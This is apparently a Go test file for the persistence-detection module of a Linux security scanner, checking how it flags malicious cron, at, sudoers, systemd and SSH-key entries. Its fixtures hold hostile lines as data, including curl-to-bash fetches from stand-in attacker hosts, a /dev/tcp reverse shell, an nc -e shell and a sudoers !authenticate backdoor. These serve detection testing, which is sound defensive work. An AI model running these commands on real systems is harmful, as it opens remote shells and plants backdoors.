package persistence_test

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"aether/internal/config"
	"aether/internal/events"
	"aether/internal/modules/persistence"
	"aether/internal/report"
)

type memoryReporter struct {
	findings []report.Finding
}

func (m *memoryReporter) Report(f report.Finding) {
	m.findings = append(m.findings, f)
}
func (m *memoryReporter) Findings() []report.Finding { return m.findings }
func (m *memoryReporter) Summary() (int, int, int, int, int) {
	var a, w, n, i int
	for _, f := range m.findings {
		switch f.Severity {
		case report.SeverityAlert:
			a++
		case report.SeverityWarning:
			w++
		case report.SeverityNotice:
			n++
		case report.SeverityInfo:
			i++
		}
	}
	return len(m.findings), a, w, n, i
}
func (m *memoryReporter) Close() error { return nil }

// TestPersistence_CleanDebianFixtureTree tests that a realistic, clean Debian-like
// directory tree produces ZERO WARNING or ALERT findings.
func TestPersistence_CleanDebianFixtureTree(t *testing.T) {
	root := t.TempDir()

	// 1. Setup dpkg database
	dpkgInfo := filepath.Join(root, "var/lib/dpkg/info")
	_ = os.MkdirAll(dpkgInfo, 0755)

	coreutilsList := `/bin/ls
/bin/cat
/usr/bin/wc
/etc/cron.daily/logrotate
/lib/systemd/system/cron.service
/lib/systemd/system/systemd-journald.service
/lib/security/pam_unix.so
`
	_ = os.WriteFile(filepath.Join(dpkgInfo, "base-files.list"), []byte(coreutilsList), 0644)

	// 2. Setup standard clean cron files
	_ = os.MkdirAll(filepath.Join(root, "etc/cron.daily"), 0755)
	cleanCron := `#!/bin/sh
test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
`
	_ = os.WriteFile(filepath.Join(root, "etc/cron.daily/standard"), []byte(cleanCron), 0755)

	// Clean crontab
	cleanCrontab := `# Standard /etc/crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 * * * * root cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
`
	_ = os.WriteFile(filepath.Join(root, "etc/crontab"), []byte(cleanCrontab), 0644)

	// 3. Setup standard systemd unit and enabled symlink
	_ = os.MkdirAll(filepath.Join(root, "lib/systemd/system"), 0755)
	_ = os.MkdirAll(filepath.Join(root, "etc/systemd/system/multi-user.target.wants"), 0755)
	cleanUnit := `[Unit]
Description=Regular Service
[Service]
ExecStart=/bin/ls
[Install]
WantedBy=multi-user.target
`
	unitPath := filepath.Join(root, "lib/systemd/system/cron.service")
	_ = os.WriteFile(unitPath, []byte(cleanUnit), 0644)
	// Symlink to package-owned unit
	_ = os.Symlink("/lib/systemd/system/cron.service", filepath.Join(root, "etc/systemd/system/multi-user.target.wants/cron.service"))

	// 4. Setup clean /etc/passwd and standard authorized_keys with comment
	_ = os.MkdirAll(filepath.Join(root, "etc"), 0755)
	passwdContent := `root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:Admin User:/home/admin:/bin/bash
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
`
	_ = os.WriteFile(filepath.Join(root, "etc/passwd"), []byte(passwdContent), 0644)

	_ = os.MkdirAll(filepath.Join(root, "root/.ssh"), 0700)
	cleanKey := "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleValidKeyFormat1234567890 admin@company.org\n"
	_ = os.WriteFile(filepath.Join(root, "root/.ssh/authorized_keys"), []byte(cleanKey), 0600)

	// 5. Clean shell profiles
	cleanProfile := `# /etc/profile
export PATH="/usr/local/bin:/usr/bin:/bin"
umask 022
`
	_ = os.WriteFile(filepath.Join(root, "etc/profile"), []byte(cleanProfile), 0644)

	// 6. Clean PAM
	_ = os.MkdirAll(filepath.Join(root, "etc/pam.d"), 0755)
	cleanPAM := `# Standard PAM login
auth required pam_unix.so nullok
account required pam_unix.so
`
	_ = os.WriteFile(filepath.Join(root, "etc/pam.d/login"), []byte(cleanPAM), 0644)
	_ = os.MkdirAll(filepath.Join(root, "lib/security"), 0755)
	_ = os.WriteFile(filepath.Join(root, "lib/security/pam_unix.so"), []byte("ELF_MODULE"), 0755)

	// 7. Clean sudoers
	cleanSudoers := `root ALL=(ALL:ALL) ALL
%sudo ALL=(ALL:ALL) ALL
`
	_ = os.WriteFile(filepath.Join(root, "etc/sudoers"), []byte(cleanSudoers), 0440)

	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)
	rep := &memoryReporter{}
	cfg := config.NewDefaultConfig()

	err := mod.Run(context.Background(), cfg, rep)
	if err != nil {
		t.Fatalf("unexpected error running clean persistence module: %v", err)
	}

	for _, f := range rep.findings {
		if f.Severity == report.SeverityWarning || f.Severity == report.SeverityAlert {
			t.Errorf("clean fixture tree raised unexpected finding (%s): %s (rule: %s, path: %s)", f.Severity, f.Reason, f.RuleName, f.Path)
		}
	}
}

// TestPersistence_MaliciousCronLine verifies detection of temp execution, reverse shells, and download|sh.
func TestPersistence_MaliciousCronLine(t *testing.T) {
	root := t.TempDir()
	_ = os.MkdirAll(filepath.Join(root, "etc/cron.d"), 0755)

	// 1. Cron executing from /tmp and piping curl into bash (2 signal classes -> ALERT)
	maliciousCron := `* * * * * root curl -s http://attacker.com/rev.sh | bash
0 0 * * * root /tmp/evil_miner
`
	_ = os.WriteFile(filepath.Join(root, "etc/cron.d/backdoor"), []byte(maliciousCron), 0644)

	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)
	rep := &memoryReporter{}
	cfg := config.NewDefaultConfig()

	err := mod.Run(context.Background(), cfg, rep)
	if err != nil {
		t.Fatal(err)
	}

	if len(rep.findings) == 0 {
		t.Fatalf("expected finding for malicious cron, got none")
	}

	f := rep.findings[0]
	if f.Severity != report.SeverityAlert {
		t.Errorf("expected ALERT for multiple persistence signals, got: %s", f.Severity)
	}
	if !strings.Contains(f.Reason, "curl") || !strings.Contains(f.Reason, "evil_miner") {
		t.Errorf("expected reasons to detail curl and evil_miner, got: %s", f.Reason)
	}
}

// TestPersistence_ReverseShellPrimitiveAlertsAlone verifies that /dev/tcp, nc -e, or bash -i
// escalate to ALERT alone without requiring a second signal class.
func TestPersistence_ReverseShellPrimitiveAlertsAlone(t *testing.T) {
	root := t.TempDir()
	_ = os.MkdirAll(filepath.Join(root, "etc/cron.d"), 0755)

	revShellCron := `* * * * * root /bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`
	_ = os.WriteFile(filepath.Join(root, "etc/cron.d/revshell"), []byte(revShellCron), 0644)

	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)
	rep := &memoryReporter{}
	cfg := config.NewDefaultConfig()

	_ = mod.Run(context.Background(), cfg, rep)
	if len(rep.findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(rep.findings))
	}
	if rep.findings[0].Severity != report.SeverityAlert {
		t.Errorf("expected reverse shell primitive to ALERT alone, got: %s", rep.findings[0].Severity)
	}
}

// TestPersistence_EnabledUnitSymlink verifies that symlinks in *.wants/ pointing to package-owned
// units are recognized as benign and not flagged.
func TestPersistence_EnabledUnitSymlink(t *testing.T) {
	root := t.TempDir()

	dpkgInfo := filepath.Join(root, "var/lib/dpkg/info")
	_ = os.MkdirAll(dpkgInfo, 0755)
	_ = os.WriteFile(filepath.Join(dpkgInfo, "openssh.list"), []byte("/lib/systemd/system/ssh.service\n"), 0644)

	_ = os.MkdirAll(filepath.Join(root, "lib/systemd/system"), 0755)
	_ = os.WriteFile(filepath.Join(root, "lib/systemd/system/ssh.service"), []byte("[Service]\nExecStart=/usr/sbin/sshd -D\n"), 0644)

	_ = os.MkdirAll(filepath.Join(root, "etc/systemd/system/multi-user.target.wants"), 0755)
	_ = os.Symlink("/lib/systemd/system/ssh.service", filepath.Join(root, "etc/systemd/system/multi-user.target.wants/ssh.service"))

	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)
	rep := &memoryReporter{}
	cfg := config.NewDefaultConfig()

	_ = mod.Run(context.Background(), cfg, rep)
	if len(rep.findings) != 0 {
		t.Errorf("expected 0 findings for package-owned unit symlink, got: %+v", rep.findings)
	}
}

// TestPersistence_SymlinkedAuthorizedKeys verifies that a symlinked authorized_keys file is flagged.
func TestPersistence_SymlinkedAuthorizedKeys(t *testing.T) {
	root := t.TempDir()
	_ = os.MkdirAll(filepath.Join(root, "etc"), 0755)
	_ = os.WriteFile(filepath.Join(root, "etc/passwd"), []byte("victim:x:1001:1001::/home/victim:/bin/bash\n"), 0644)

	_ = os.MkdirAll(filepath.Join(root, "home/victim/.ssh"), 0700)
	_ = os.MkdirAll(filepath.Join(root, "tmp"), 0777)
	realKey := filepath.Join(root, "tmp/injected_key")
	_ = os.WriteFile(realKey, []byte("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI1234567890 attacker@evil\n"), 0644)

	_ = os.Symlink("/tmp/injected_key", filepath.Join(root, "home/victim/.ssh/authorized_keys"))

	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)
	rep := &memoryReporter{}
	cfg := config.NewDefaultConfig()

	_ = mod.Run(context.Background(), cfg, rep)
	if len(rep.findings) == 0 {
		t.Fatalf("expected symlinked authorized_keys to be flagged")
	}

	foundSymlinkRule := false
	for _, f := range rep.findings {
		if strings.Contains(f.RuleName, "Persistence_SSH_Symlink_Key") {
			foundSymlinkRule = true
			break
		}
	}
	if !foundSymlinkRule {
		t.Errorf("expected Persistence_SSH_Symlink_Key rule match, got: %+v", rep.findings)
	}
}

// TestPersistence_SecretRedaction verifies passwords, tokens, and credentials are redacted in snippets.
func TestPersistence_SecretRedaction(t *testing.T) {
	raw := `curl -u admin:SuperSecret123! https://internal.corp/script.sh | bash`
	redacted := persistence.RedactSnippet(raw)

	if strings.Contains(redacted, "SuperSecret123!") {
		t.Errorf("redaction failed: password visible in snippet: %s", redacted)
	}
	if !strings.Contains(redacted, "[REDACTED]") {
		t.Errorf("expected [REDACTED] in snippet, got: %s", redacted)
	}

	raw2 := `wget http://user:pass123@malware.com/drop.sh`
	redacted2 := persistence.RedactSnippet(raw2)
	if strings.Contains(redacted2, "pass123") {
		t.Errorf("redaction failed for user:pass@: %s", redacted2)
	}
}

// TestPersistence_CloudStyleSudoers verifies that NOPASSWD: ALL alone produces NOTICE and is NOT raised alone.
func TestPersistence_CloudStyleSudoers(t *testing.T) {
	root := t.TempDir()
	_ = os.MkdirAll(filepath.Join(root, "etc/sudoers.d"), 0755)

	// Cloud-init standard sudoers line
	cloudInit := `ubuntu ALL=(ALL) NOPASSWD:ALL`
	_ = os.WriteFile(filepath.Join(root, "etc/sudoers.d/90-cloud-init-users"), []byte(cloudInit), 0440)

	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)
	rep := &memoryReporter{}
	cfg := config.NewDefaultConfig()

	_ = mod.Run(context.Background(), cfg, rep)
	if len(rep.findings) != 0 {
		t.Errorf("cloud-style NOPASSWD: ALL alone should NOT raise finding, got: %+v", rep.findings)
	}

	// But !authenticate MUST be flagged as WARNING
	_ = os.WriteFile(filepath.Join(root, "etc/sudoers.d/99-backdoor"), []byte("ALL ALL=(ALL) !authenticate ALL"), 0440)
	rep2 := &memoryReporter{}
	_ = mod.Run(context.Background(), cfg, rep2)
	if len(rep2.findings) != 1 {
		t.Fatalf("expected 1 finding for !authenticate, got %d", len(rep2.findings))
	}
	if rep2.findings[0].Severity != report.SeverityWarning {
		t.Errorf("expected WARNING for !authenticate, got: %s", rep2.findings[0].Severity)
	}
}

// TestPersistence_RootFSSymlinkEscape verifies that symlinks escaping rootFS are detected.
func TestPersistence_RootFSSymlinkEscape(t *testing.T) {
	root := t.TempDir()
	_ = os.MkdirAll(filepath.Join(root, "etc/systemd/system"), 0755)

	// Symlink pointing outside rootFS
	_ = os.Symlink("../../../../../../../etc/shadow", filepath.Join(root, "etc/systemd/system/escape.service"))

	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)
	rep := &memoryReporter{}
	cfg := config.NewDefaultConfig()

	_ = mod.Run(context.Background(), cfg, rep)
	foundEscape := false
	for _, f := range rep.findings {
		if strings.Contains(f.RuleName, "Persistence_Systemd_Symlink_Escape") {
			foundEscape = true
			if f.Severity != report.SeverityAlert {
				t.Errorf("expected ALERT for rootFS escape symlink, got: %s", f.Severity)
			}
			break
		}
	}
	if !foundEscape {
		t.Errorf("expected escape symlink finding, got: %+v", rep.findings)
	}
}

// TestPersistence_OversizedOrBinaryCronFile verifies that binary files dropped in cron.d are flagged.
func TestPersistence_OversizedOrBinaryCronFile(t *testing.T) {
	root := t.TempDir()
	_ = os.MkdirAll(filepath.Join(root, "etc/cron.d"), 0755)

	// Binary ELF file dropped in cron.d
	elfHeader := []byte("\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")
	_ = os.WriteFile(filepath.Join(root, "etc/cron.d/elf_drop"), elfHeader, 0755)

	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)
	rep := &memoryReporter{}
	cfg := config.NewDefaultConfig()

	_ = mod.Run(context.Background(), cfg, rep)
	if len(rep.findings) != 1 {
		t.Fatalf("expected 1 finding for binary cron file, got %d", len(rep.findings))
	}
	if rep.findings[0].RuleName != "Persistence_Cron_Binary_File" {
		t.Errorf("expected Persistence_Cron_Binary_File, got: %s", rep.findings[0].RuleName)
	}
}

// TestPersistence_AtJobs verifies that commands in /var/spool/at are inspected.
func TestPersistence_AtJobs(t *testing.T) {
	root := t.TempDir()
	_ = os.MkdirAll(filepath.Join(root, "var/spool/at"), 0755)

	atJobContent := `#!/bin/sh
# At job executing reverse shell
nc -e /bin/sh 10.0.0.1 1337
`
	_ = os.WriteFile(filepath.Join(root, "var/spool/at/a0000101a8ef"), []byte(atJobContent), 0700)

	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)
	rep := &memoryReporter{}
	cfg := config.NewDefaultConfig()

	_ = mod.Run(context.Background(), cfg, rep)
	if len(rep.findings) != 1 {
		t.Fatalf("expected 1 finding for malicious at job, got %d", len(rep.findings))
	}
	if rep.findings[0].Severity != report.SeverityAlert {
		t.Errorf("expected ALERT for nc -e reverse shell in at job, got: %s", rep.findings[0].Severity)
	}
}

// TestPersistence_UnreadableDirectoryCoverage verifies unreadable directories are recorded.
func TestPersistence_UnreadableDirectoryCoverage(t *testing.T) {
	if os.Getuid() == 0 {
		t.Skip("skipping permission test as root")
	}

	root := t.TempDir()
	unreadableCron := filepath.Join(root, "var/spool/cron")
	_ = os.MkdirAll(unreadableCron, 0000)
	defer os.Chmod(unreadableCron, 0755)

	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)
	rep := &memoryReporter{}
	cfg := config.NewDefaultConfig()

	_ = mod.Run(context.Background(), cfg, rep)
	cov := mod.Coverage()
	if cov.TotalUnreadable == 0 {
		t.Errorf("expected TotalUnreadable > 0, got %d", cov.TotalUnreadable)
	}
}

// TestPersistence_BreakdownEqualsEmittedFindings verifies that the ScanFinished severity breakdown
// equals the count of emitted findings across all severities (including INFO).
func TestPersistence_BreakdownEqualsEmittedFindings(t *testing.T) {
	root := t.TempDir()
	_ = os.MkdirAll(filepath.Join(root, "etc/cron.d"), 0755)
	_ = os.MkdirAll(filepath.Join(root, "etc/sudoers.d"), 0755)

	// 1. ALERT: reverse shell
	_ = os.WriteFile(filepath.Join(root, "etc/cron.d/rev"), []byte("* * * * * root /bin/bash -i >& /dev/tcp/1.1.1.1/80\n"), 0644)
	// 2. WARNING: !authenticate
	_ = os.WriteFile(filepath.Join(root, "etc/sudoers.d/noauth"), []byte("ALL ALL=(ALL) !authenticate ALL\n"), 0440)
	// 3. NOTICE: missing target
	_ = os.WriteFile(filepath.Join(root, "etc/cron.d/missing"), []byte("* * * * * root /opt/missing_tool/bin/run\n"), 0644)

	cfg := config.NewDefaultConfig()
	rep := &memoryReporter{}
	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)
	_ = mod.Run(context.Background(), cfg, rep)

	alerts, warnings, notices, infos := 0, 0, 0, 0
	for _, f := range rep.findings {
		switch f.Severity {
		case report.SeverityAlert:
			alerts++
		case report.SeverityWarning:
			warnings++
		case report.SeverityNotice:
			notices++
		case report.SeverityInfo:
			infos++
		}
	}

	total := len(rep.findings)
	if total == 0 {
		t.Fatal("expected at least 1 finding in breakdown test fixture")
	}

	scanFin := events.ScanFinished{
		Time:          time.Now(),
		TotalFindings: total,
		Alerts:        alerts,
		Warnings:      warnings,
		Notices:       notices,
		Infos:         infos,
	}

	sumBreakdown := scanFin.Alerts + scanFin.Warnings + scanFin.Notices + scanFin.Infos
	if sumBreakdown != scanFin.TotalFindings {
		t.Errorf("breakdown sum (%d) does not match TotalFindings (%d)", sumBreakdown, scanFin.TotalFindings)
	}
	if scanFin.TotalFindings != len(rep.findings) {
		t.Errorf("TotalFindings (%d) does not match emitted findings count (%d)", scanFin.TotalFindings, len(rep.findings))
	}
}

// TestPersistence_UserCrontabInspection verifies that /var/spool/cron/crontabs enumerates
// regular files, reads 0600 user crontabs via the safe-open helper, flags malicious user crontabs (curl|sh),
// ignores benign crontabs, and never treats subdirectories as unreadable or not-regular files.
func TestPersistence_UserCrontabInspection(t *testing.T) {
	root := t.TempDir()
	crontabsDir := filepath.Join(root, "var/spool/cron/crontabs")
	_ = os.MkdirAll(crontabsDir, 0755)

	// 1. Malicious user crontab (curl piped into sh) with 0600 mode
	maliciousUserCron := `# User crontab for attacker
* * * * * curl -s http://attacker.example.com/rev.sh | sh
`
	_ = os.WriteFile(filepath.Join(crontabsDir, "attacker"), []byte(maliciousUserCron), 0600)

	// 2. Benign user crontab with an existing binary and 0600 mode
	_ = os.MkdirAll(filepath.Join(root, "usr/bin"), 0755)
	_ = os.WriteFile(filepath.Join(root, "usr/bin/backup-home.sh"), []byte("#!/bin/sh\necho backup\n"), 0755)
	benignUserCron := `# User crontab for alice
0 5 * * * /usr/bin/backup-home.sh
`
	_ = os.WriteFile(filepath.Join(crontabsDir, "alice"), []byte(benignUserCron), 0600)

	// Direct test: Verify that the safe-open helper successfully reads a 0600 file inside crontabs
	data, isSymlink, rErr := persistence.SafeReadRegularFile(root, "/var/spool/cron/crontabs/alice", 1024*1024)
	if rErr != nil {
		t.Fatalf("SafeReadRegularFile failed on 0600 user crontab: %v", rErr)
	}
	if isSymlink {
		t.Errorf("expected isSymlink == false for regular user crontab")
	}
	if !strings.Contains(string(data), "/usr/bin/backup-home.sh") {
		t.Errorf("unexpected content read from 0600 crontab: %s", string(data))
	}

	// 3. Subdirectory inside /var/spool/cron/crontabs (should be skipped, not counted as unreadable)
	_ = os.MkdirAll(filepath.Join(crontabsDir, "subfolder"), 0755)

	cfg := config.NewDefaultConfig()
	rep := &memoryReporter{}
	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)

	err := mod.Run(context.Background(), cfg, rep)
	if err != nil {
		t.Fatalf("unexpected error running persistence module: %v", err)
	}

	cov := mod.Coverage()
	if cov.TotalUnreadable != 0 {
		t.Errorf("expected TotalUnreadable == 0, got %d (paths: %+v)", cov.TotalUnreadable, cov.UnreadablePaths)
	}

	cronCov := cov.Checks["cron"]
	if cronCov.Inspected < 2 {
		t.Errorf("expected cron Inspected >= 2, got %d", cronCov.Inspected)
	}

	// Verify only attacker crontab was flagged
	if len(rep.findings) != 1 {
		t.Fatalf("expected exactly 1 finding for attacker crontab, got %d (%+v)", len(rep.findings), rep.findings)
	}

	f := rep.findings[0]
	if f.Path != "/var/spool/cron/crontabs/attacker" {
		t.Errorf("expected finding on /var/spool/cron/crontabs/attacker, got: %s", f.Path)
	}
	if f.Severity != report.SeverityWarning {
		t.Errorf("expected WARNING for download-and-execute cron, got: %s", f.Severity)
	}
	if !strings.Contains(f.RuleName, "Persistence_Download_And_Execute") {
		t.Errorf("expected Persistence_Download_And_Execute rule, got: %s", f.RuleName)
	}
}

// TestPersistence_MaskedUnits verifies that systemd units symlinked to /dev/null
// are counted as Masked, deduped by resolved path across merged-/usr trees, produce zero findings,
// and are not marked as unreadable.
func TestPersistence_MaskedUnits(t *testing.T) {
	root := t.TempDir()
	systemdDir := filepath.Join(root, "etc/systemd/system")
	_ = os.MkdirAll(systemdDir, 0755)

	// 1. Direct masked units in /etc/systemd/system symlinked to /dev/null
	_ = os.Symlink("/dev/null", filepath.Join(systemdDir, "hostapd.service"))
	_ = os.Symlink("/dev/null", filepath.Join(systemdDir, "iodined.service"))

	// 2. Merged-/usr scenario: /usr/lib/systemd/system and /lib symlinked to usr/lib
	usrLibDir := filepath.Join(root, "usr/lib/systemd/system")
	_ = os.MkdirAll(usrLibDir, 0755)
	_ = os.Symlink("usr/lib", filepath.Join(root, "lib"))
	_ = os.Symlink("/dev/null", filepath.Join(usrLibDir, "merged-masked.service"))

	cfg := config.NewDefaultConfig()
	rep := &memoryReporter{}
	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)

	err := mod.Run(context.Background(), cfg, rep)
	if err != nil {
		t.Fatalf("unexpected error running persistence module: %v", err)
	}

	cov := mod.Coverage()
	// Should be exactly 3 masked units (hostapd, iodined, merged-masked), not 4
	if cov.TotalMasked != 3 {
		t.Errorf("expected TotalMasked == 3, got %d (masked paths: %+v)", cov.TotalMasked, cov.MaskedPaths)
	}
	if cov.TotalUnreadable != 0 {
		t.Errorf("expected TotalUnreadable == 0, got %d (unreadable paths: %+v)", cov.TotalUnreadable, cov.UnreadablePaths)
	}
	if len(rep.findings) != 0 {
		t.Errorf("expected 0 findings for masked units, got %d (%+v)", len(rep.findings), rep.findings)
	}

	// Verify merged-masked.service was resolved to /usr/lib/systemd/system/merged-masked.service and not duplicated
	countMerged := 0
	for _, p := range cov.MaskedPaths {
		if strings.Contains(p, "merged-masked.service") {
			countMerged++
			if p != "/usr/lib/systemd/system/merged-masked.service" {
				t.Errorf("expected resolved path /usr/lib/systemd/system/merged-masked.service, got: %s", p)
			}
		}
	}
	if countMerged != 1 {
		t.Errorf("expected merged-masked.service to appear exactly once, got %d times in %+v", countMerged, cov.MaskedPaths)
	}
}

// TestPersistence_DedupeUnreadablePaths verifies that duplicate unreadable path records
// are deduped so the same path is never listed twice.
func TestPersistence_DedupeUnreadablePaths(t *testing.T) {
	cov := persistence.CheckCoverage{Name: "test"}
	cov.RecordUnreadable("/etc/secret", os.ErrPermission)
	cov.RecordUnreadable("/etc/secret", os.ErrPermission)
	cov.RecordUnreadable("/etc/other", os.ErrPermission)

	if cov.Unreadable != 2 {
		t.Errorf("expected 2 unreadable files after deduplication, got %d", cov.Unreadable)
	}
	if len(cov.UnreadablePaths) != 2 {
		t.Errorf("expected 2 UnreadablePaths entries, got %d", len(cov.UnreadablePaths))
	}
}

type busReporter struct {
	bus *events.EventBus
}

func (b *busReporter) Report(f report.Finding) {
	if b.bus != nil {
		b.bus.Publish(events.FindingRaised{
			Time:    time.Now(),
			Finding: f,
		})
	}
}
func (b *busReporter) Findings() []report.Finding         { return nil }
func (b *busReporter) Summary() (int, int, int, int, int) { return 0, 0, 0, 0, 0 }
func (b *busReporter) Close() error                       { return nil }

func TestPersistence_RedactSnippet_NoOverRedaction(t *testing.T) {
	cases := []struct {
		input    string
		expected string
	}{
		{
			input:    "/usr/local/sbin/set-grub-install-devices",
			expected: "/usr/local/sbin/set-grub-install-devices",
		},
		{
			input:    "ssh -i /root/.ssh/id_rsa user@host",
			expected: "ssh -i [REDACTED_KEY] user@host",
		},
		{
			input:    "/usr/bin/python3 /usr/lib/.libpam-xdg-support/.update-helper &  # pam-xdg-install",
			expected: "/usr/bin/python3 /usr/lib/.libpam-xdg-support/.update-helper &  # pam-xdg-install",
		},
	}

	for _, c := range cases {
		out := persistence.RedactSnippet(c.input)
		if out != c.expected {
			t.Errorf("RedactSnippet(%q) = %q; want %q", c.input, out, c.expected)
		}
	}
}

func TestPersistence_HiddenSystemPathDetection(t *testing.T) {
	cfg := config.NewDefaultConfig()
	signals := persistence.CheckSuspiciousCommand(
		"/usr/bin/python3 /usr/lib/.libpam-xdg-support/.update-helper >/dev/null 2>&1",
		1,
		cfg,
		"",
		true,
		nil,
	)

	hasHiddenPathWarning := false
	for _, s := range signals {
		if s.RuleName == "Persistence_Exec_From_Hidden_Path" && s.Severity == report.SeverityWarning {
			hasHiddenPathWarning = true
			break
		}
	}

	if !hasHiddenPathWarning {
		t.Errorf("expected Persistence_Exec_From_Hidden_Path warning for /usr/lib/.libpam-xdg-support/.update-helper, got: %+v", signals)
	}
}

func TestPersistence_RedactSnippet_ScopedFlag(t *testing.T) {
	cases := []struct {
		input    string
		expected string
	}{
		{
			input:    "grep -i foo /etc/shadow",
			expected: "grep -i foo /etc/shadow",
		},
		{
			input:    "sed -i 's/foo/bar/' /etc/hosts",
			expected: "sed -i 's/foo/bar/' /etc/hosts",
		},
		{
			input:    "ssh -i /root/.ssh/id_rsa user@host",
			expected: "ssh -i [REDACTED_KEY] user@host",
		},
		{
			input:    "scp -i /home/user/.ssh/id_ed25519 src user@host:/dest",
			expected: "scp -i [REDACTED_KEY] src user@host:/dest",
		},
		{
			input:    "sftp -i /root/.ssh/key remote:/path /local/path",
			expected: "sftp -i [REDACTED_KEY] remote:/path /local/path",
		},
	}

	for _, c := range cases {
		out := persistence.RedactSnippet(c.input)
		if out != c.expected {
			t.Errorf("RedactSnippet(%q) = %q; want %q", c.input, out, c.expected)
		}
	}
}

func TestPersistence_BenignTwinDaemon_NoAlert(t *testing.T) {
	root := t.TempDir()

	// 1. Setup dpkg database owning /usr/sbin/cron-daemon
	dpkgInfo := filepath.Join(root, "var/lib/dpkg/info")
	_ = os.MkdirAll(dpkgInfo, 0755)
	_ = os.WriteFile(filepath.Join(dpkgInfo, "cron.list"), []byte("/usr/sbin/cron-daemon\n"), 0644)

	// Create the binary on disk
	_ = os.MkdirAll(filepath.Join(root, "usr/sbin"), 0755)
	_ = os.WriteFile(filepath.Join(root, "usr/sbin/cron-daemon"), []byte("#!/bin/sh\nexit 0\n"), 0755)

	// 2. Reference by systemd unit
	_ = os.MkdirAll(filepath.Join(root, "etc/systemd/system"), 0755)
	systemdUnit := `[Unit]
Description=Cron Daemon
[Service]
ExecStart=/usr/sbin/cron-daemon
`
	_ = os.WriteFile(filepath.Join(root, "etc/systemd/system/cron-daemon.service"), []byte(systemdUnit), 0644)

	// 3. Reference by init.d script
	_ = os.MkdirAll(filepath.Join(root, "etc/init.d"), 0755)
	initScript := `#!/bin/sh
/usr/sbin/cron-daemon &
exit 0
`
	_ = os.WriteFile(filepath.Join(root, "etc/init.d/cron-daemon"), []byte(initScript), 0755)

	// 4. Reference by cron.d
	_ = os.MkdirAll(filepath.Join(root, "etc/cron.d"), 0755)
	cronEntry := `* * * * * root /usr/sbin/cron-daemon
`
	_ = os.WriteFile(filepath.Join(root, "etc/cron.d/cron-daemon"), []byte(cronEntry), 0644)

	cfg := config.NewDefaultConfig()
	rep := &memoryReporter{}
	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)

	err := mod.Run(context.Background(), cfg, rep)
	if err != nil {
		t.Fatalf("unexpected error running persistence module: %v", err)
	}

	for _, f := range rep.findings {
		if f.RuleName == "Persistence_Multi_Vector_Persistence" {
			t.Errorf("expected NO Multi_Vector_Persistence alert for package-owned daemon, but got: %+v", f)
		}
		if f.Severity == report.SeverityAlert || f.Severity == report.SeverityWarning {
			t.Errorf("expected 0 Alerts/Warnings for benign twin daemon, got %s finding: %+v", f.Severity, f)
		}
	}
}

func TestPersistence_HomeCachePath_InfoSeverity(t *testing.T) {
	root := t.TempDir()

	_ = os.MkdirAll(filepath.Join(root, "etc"), 0755)
	passwd := `root:x:0:0:root:/root:/bin/bash
alice:x:1000:1000:Alice:/home/alice:/bin/bash
`
	_ = os.WriteFile(filepath.Join(root, "etc/passwd"), []byte(passwd), 0644)

	// Create executable in ~/.cache/
	aliceCache := filepath.Join(root, "home/alice/.cache")
	_ = os.MkdirAll(aliceCache, 0755)
	_ = os.WriteFile(filepath.Join(aliceCache, "dropper.sh"), []byte("#!/bin/sh\necho hello\n"), 0755)

	// Reference in ~/.bashrc
	_ = os.WriteFile(filepath.Join(root, "home/alice/.bashrc"), []byte("/home/alice/.cache/dropper.sh\n"), 0644)

	cfg := config.NewDefaultConfig()
	rep := &memoryReporter{}
	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)

	err := mod.Run(context.Background(), cfg, rep)
	if err != nil {
		t.Fatalf("unexpected error running persistence module: %v", err)
	}

	foundCacheFinding := false
	for _, f := range rep.findings {
		if f.RuleName == "Persistence_Exec_From_Home_Cache_Path" {
			foundCacheFinding = true
			if f.Severity != report.SeverityInfo {
				t.Errorf("expected INFO severity for home cache finding, got %s", f.Severity)
			}
		}
	}

	if !foundCacheFinding {
		t.Errorf("expected Persistence_Exec_From_Home_Cache_Path finding for dropper in ~/.cache, got findings: %+v", rep.findings)
	}
}

func TestPersistence_BenignToolDirs(t *testing.T) {
	root := t.TempDir()

	_ = os.MkdirAll(filepath.Join(root, "etc"), 0755)
	passwd := `root:x:0:0:root:/root:/bin/bash
bob:x:1001:1001:Bob:/home/bob:/bin/bash
`
	_ = os.WriteFile(filepath.Join(root, "etc/passwd"), []byte(passwd), 0644)

	// Create benign tool directories with real files
	venvBin := filepath.Join(root, "home/bob/.venv/bin")
	_ = os.MkdirAll(venvBin, 0755)
	_ = os.WriteFile(filepath.Join(venvBin, "python"), []byte("#!/bin/sh\nexit 0\n"), 0755)

	cargoBin := filepath.Join(root, "home/bob/.cargo/bin")
	_ = os.MkdirAll(cargoBin, 0755)
	_ = os.WriteFile(filepath.Join(cargoBin, "cargo"), []byte("#!/bin/sh\nexit 0\n"), 0755)

	// Reference in ~/.bashrc
	bashrcContent := `/home/bob/.venv/bin/python -m app
/home/bob/.cargo/bin/cargo build
`
	_ = os.WriteFile(filepath.Join(root, "home/bob/.bashrc"), []byte(bashrcContent), 0644)

